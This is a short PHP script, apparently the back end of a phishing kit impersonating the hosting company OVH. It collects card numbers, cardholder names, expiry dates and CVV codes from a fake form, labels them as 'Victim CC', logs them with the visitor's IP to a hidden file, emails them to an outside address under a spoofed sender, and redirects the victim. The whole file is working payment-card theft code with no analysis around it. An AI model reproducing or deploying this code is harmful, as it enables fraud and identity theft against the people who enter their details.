<?php
$pg=$_REQUEST['page'];
$ip = getenv("REMOTE_ADDR");
$bin4 = substr($_POST['s1'] , 12 , 16);
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "index2.php?page=$bin4" ;
$hostname = gethostbyaddr($ip);
$message .= "************ Victim CC ***********\n";
$message .= "Card Number    : ".$_POST['s1']."\n";
$message .= "Full Name   : ".$_POST['s2']."\n";
$message .= "Expiry Date   : ".$_POST['s3']."-".$_POST['s4']."\n";
$message .= "CSC/CVV    : ".$_POST['s5']."\n";
$message .= "------------------------------------\n";
$message .= "URL   : http://$link\n";
$message .= "************ Linkin ***********\n";
$send = "rzl88@yandex.com";
@fclose(@fwrite(@fopen("../loqsqsf111111111.txt", "a"), $message."\r\n"));
$subject = "OVH | New CC  [$ip] *** ";
$headers = "From: Sriyfa<config@serverstrato.net>";
mail($send,$subject,$message,$headers);
header("Location: $back");


?>